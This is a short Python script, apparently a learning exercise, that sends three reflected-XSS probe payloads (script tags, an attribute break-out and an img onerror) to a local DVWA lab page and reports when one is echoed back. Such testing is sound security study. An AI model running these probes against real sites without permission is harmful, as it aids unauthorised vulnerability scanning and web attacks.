import requests

XSS_PAYLOADS = ['<script>alert(1)</script>', '" onmouseover="alert(1)', "<img src=x onerror=alert(1)>"]

class XSSTester:
    def __init__(self, url):
        self.url = url

    def test_xss(self):
        for payload in XSS_PAYLOADS:
            params = {"input": payload}
            r = requests.get(self.url, params=params)
            if payload in r.text:
                print("[!] XSS Vulnerability Found:", self.url)
                print("Payload:", payload)

x = XSSTester("http://localhost/dvwa/vulnerabilities/xss_r/")
x.test_xss()
